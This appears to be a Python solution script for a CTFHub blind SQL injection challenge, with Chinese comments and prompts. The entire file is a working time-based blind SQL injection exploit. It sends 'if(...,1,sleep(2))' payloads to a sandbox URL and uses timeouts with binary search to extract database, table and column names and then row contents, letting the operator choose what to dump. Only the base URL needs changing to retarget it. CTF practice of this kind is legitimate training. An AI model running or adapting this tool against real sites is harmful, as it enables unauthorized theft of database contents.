import requests
from urllib.parse import quote

base_url = "http://challenge-59668c27594f7541.sandbox.ctfhub.com:10800/?id="
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://challenge-59668c27594f7541.sandbox.ctfhub.com:10800/", "Upgrade-Insecure-Requests": "1"}

def get_database_length():
    global base_url, headers
    length = 1
    while (1):
        id = "1 and if(length(database()) = " + str(length) + ", 1, sleep(2))"
        url = base_url + quote(id) #很重要，因为id中有许多特殊字符，比如#，需要进行url编码
        try:
            requests.get(url, headers=headers, timeout=1).text
        except Exception:
            print("database length", length, "failed!")
            length+=1
        else:
            print("database length", length, "success")
            print("payload:", id)
            break
    print("数据库名的长度为", length)
    return length

def get_database(database_length):
    global base_url, headers
    database = ""
    for i in range(1, database_length + 1):
        l, r = 0, 127 #神奇的申明方法
        while (1):
            ascii = (l + r) // 2
            id_equal = "1 and if(ascii(substr(database(), " + str(i) + ", 1)) = " + str(ascii) + ", 1, sleep(2))"
            try:
                requests.get(base_url + quote(id_equal), headers=headers, timeout=1).text
            except Exception:
                id_bigger = "1 and if(ascii(substr(database(), " + str(i) + ", 1)) > " + str(ascii) + ", 1, sleep(2))"
                try:
                    requests.get(base_url + quote(id_bigger), headers=headers, timeout=1).text
                except Exception:
                    r = ascii - 1
                else:
                    l = ascii + 1
            else:
                database += chr(ascii)
                print ("目前已知数据库名", database)
                break

    print("数据库名为", database)
    return database

def get_table_num(database):
    global base_url, headers
    num = 1
    while (1):
        id = "1 and if((select count(table_name) from information_schema.tables where table_schema = '" + database + "') = " + str(num) + ", 1, sleep(2))"
        try:
            requests.get(base_url + quote(id), headers=headers, timeout=1).text
        except Exception:
            num += 1
        else:
            print("payload:", id)
            print("数据库中有", num, "个表")
            break
    return num

def get_table_length(index, database):
    global base_url, headers
    length = 1
    while (1):
        id = "1 and if((select length(table_name) from information_schema.tables where table_schema = '" + database + "' limit " + str(index) + ", 1) = " + str(length) + ", 1, sleep(2))"
        try:
            requests.get(base_url + quote(id), headers=headers, timeout= 1).text
        except Exception:
            print("table length", length, "failed!")
            length+=1
        else:
            print("table length", length, "success")
            print("payload:", id)
            break
    print("数据表名的长度为", length)
    return length

def get_table(index, table_length, database):
    global base_url, headers
    table = ""
    for i in range(1, table_length + 1):
        l, r = 0, 127 #神奇的申明方法
        while (1):
            ascii = (l + r) // 2
            id_equal = "1 and if((select ascii(substr(table_name, " + str(i) + ", 1)) from information_schema.tables where table_schema = '" + database + "' limit " + str(index) + ",1) = " + str(ascii) + ", 1, sleep(2))"
            try:
                response = requests.get(base_url + quote(id_equal), headers=headers, timeout=1).text
            except Exception:
                id_bigger = "1 and if((select ascii(substr(table_name, " + str(i) + ", 1)) from information_schema.tables where table_schema = '" + database + "' limit " + str(index) + ",1) > " + str(ascii) + ", 1, sleep(2))"
                try:
                    response = requests.get(base_url + quote(id_bigger), headers=headers, timeout=1).text
                except Exception:
                    r = ascii - 1
                else:
                    l = ascii + 1
            else:
                table += chr(ascii)
                print ("目前已知数据库名", table)
                break
    print("数据表名为", table)
    return table

def get_column_num(table):
    global base_url, headers
    num = 1
    while (1):
        id = "1 and if((select count(column_name) from information_schema.columns where table_name = '" + table + "') = " + str(num) + ", 1, sleep(2))"
        try:
            requests.get(base_url + quote(id), headers=headers, timeout=1).text
        except Exception:
            num += 1
        else:
            print("payload:", id)
            print("数据表", table, "中有", num, "个字段")
            break
    return num

def get_column_length(index, table):
    global base_url, headers
    length = 1
    while (1):
        id = "1 and if((select length(column_name) from information_schema.columns where table_name = '" + table + "' limit " + str(index) + ", 1) = " + str(length) + ", 1, sleep(2))"
        try:
            requests.get(base_url + quote(id), headers=headers, timeout=1).text
        except Exception:
            print("column length", length, "failed!")
            length+=1
        else:
            print("column length", length, "success")
            print("payload:", id)
            break
    print("数据表", table, "第", index, "个字段的长度为", length)
    return length

def get_column(index, column_length, table):
    global base_url, headers
    column = ""
    for i in range(1, column_length + 1):
        l, r = 0, 127 #神奇的申明方法
        while (1):
            ascii = (l + r) // 2
            id_equal = "1 and if((select ascii(substr(column_name, " + str(i) + ", 1)) from information_schema.columns where table_name = '" + table + "' limit " + str(index) + ",1) = " + str(ascii) + ", 1, sleep(2))"
            try:
                requests.get(base_url + quote(id_equal), headers=headers, timeout=1).text
            except Exception:
                id_bigger = "1 and if((select ascii(substr(column_name, " + str(i) + ", 1)) from information_schema.columns where table_name = '" + table + "' limit " + str(index) + ",1) > " + str(ascii) + ", 1, sleep(2))"
                try:
                    requests.get(base_url + quote(id_bigger), headers=headers, timeout=1).text
                except Exception:
                    r = ascii - 1
                else:
                    l = ascii + 1
            else:
                column += chr(ascii)
                print ("目前已知字段为", column)
                break

    print("数据表", table, "第", index, "个字段名为", column)
    return column

def get_flag_num(column, table):
    global base_url, headers
    num = 1
    while (1):
        id = "1 and if((select count(" + column + ") from " + table + ") = " + str(num) + ", 1, sleep(2))"
        try:
            requests.get(base_url + quote(id), headers=headers, timeout=1).text
        except Exception:
            num += 1
        else:
            print("payload:", id)
            print("数据表", table, "中有", num, "行数据")
            break
    return num

def get_flag_length(index, column, table):
    global base_url, headers
    length = 1
    while (1):
        id = "1 and if((select length(" + column + ") from " + table + " limit " + str(index) + ", 1) = " + str(length) + ", 1, sleep(2))"
        try:
            requests.get(base_url + quote(id), headers=headers, timeout=1).text
        except Exception:
            print("flag length", length, "failed!")
            length+=1
        else:
            print("flag length", length, "success")
            print("payload:", id)
            break
    print("数据表", table, "第", index, "行数据的长度为", length)
    return length

def get_flag(index, flag_length, column, table):
    global base_url, headers
    flag = ""
    for i in range(1, flag_length + 1):
        l, r = 0, 127 #神奇的申明方法
        while (1):
            ascii = (l + r) // 2
            id_equal = "1 and if((select ascii(substr(" + column + ", " + str(i) + ", 1)) from " + table + " limit " + str(index) + ",1) = " + str(ascii) + ", 1, sleep(2))"
            try:
                requests.get(base_url + quote(id_equal), headers=headers, timeout=1).text
            except Exception:
                id_bigger = "1 and if((select ascii(substr(" + column + ", " + str(i) + ", 1)) from " + table + " limit " + str(index) + ",1) > " + str(ascii) + ", 1, sleep(2))"
                try:
                    requests.get(base_url + quote(id_bigger), headers=headers, timeout=1).text
                except Exception:
                    r = ascii - 1
                else:
                    l = ascii + 1
            else:
                flag += chr(ascii)
                print ("目前已知flag为", flag)
                break
    print("数据表", table, "第", index, "行数据为", flag)
    return flag

if __name__ == "__main__":
    print("---------------------")
    print("开始获取数据库名长度")
    database_length = get_database_length()
    print("---------------------")
    print("开始获取数据库名")
    database = get_database(database_length)
    print("---------------------")
    print("开始获取数据表的个数")
    table_num = get_table_num(database)
    tables = []
    print("---------------------")
    for i in range(0, table_num):
        print("开始获取第", i + 1, "个数据表的名称的长度")
        table_length = get_table_length(i, database)
        print("---------------------")
        print("开始获取第", i + 1, "个数据表的名称")
        table = get_table(i, table_length, database)
        tables.append(table)
    while(1): #在这个循环中可以进入所有的数据表一探究竟
        print("---------------------")
        print("现在得到了以下数据表", tables)
        table = input("请在这些数据表中选择一个目标: ")
        while( table not in tables ):
            print("你输入有误")
            table = input("请重新选择一个目标")
        print("---------------------")
        print("选择成功，开始获取数据表", table, "的字段数量")
        column_num = get_column_num(table)
        columns = []
        print("---------------------")
        for i in range(0, column_num):
            print("开始获取数据表", table, "第", i + 1, "个字段名称的长度")
            column_length = get_column_length(i, table)
            print("---------------------")
            print("开始获取数据表", table, "第", i + 1, "个字段的名称")
            column = get_column(i, column_length, table)
            columns.append(column)
        while(1): #在这个循环中可以获取当前选择数据表的所有字段记录
            print("---------------------")
            print("现在得到了数据表", table, "中的以下字段", columns)
            column = input("请在这些字段中选择一个目标: ")
            while( column not in columns ):
                print("你输入有误")
                column = input("请重新选择一个目标")
            print("---------------------")
            print("选择成功，开始获取数据表", table, "的记录数量")
            flag_num = get_flag_num(column, table)
            flags = []
            print("---------------------")
            for i in range(0, flag_num):
                print("开始获取数据表", table, "的", column, "字段的第", i + 1, "行记录的长度")
                flag_length = get_flag_length(i, column, table)
                print("---------------------")
                print("开始获取数据表", table, "的", column, "字段的第", i + 1, "行记录的内容")
                flag = get_flag(i, flag_length, column, table)
                flags.append(flag)
            print("---------------------")
            print("现在得到了数据表", table, "中", column, "字段中的以下记录", flags)
            quit = input("继续切换字段吗？(y/n)")
            if (quit == 'n' or quit == 'N'):
                break
            else:
                continue
        quit = input("继续切换数据表名吗？(y/n)")
        if (quit == 'n' or quit == 'N'):
            break
        else:
            continue
    print("bye~")
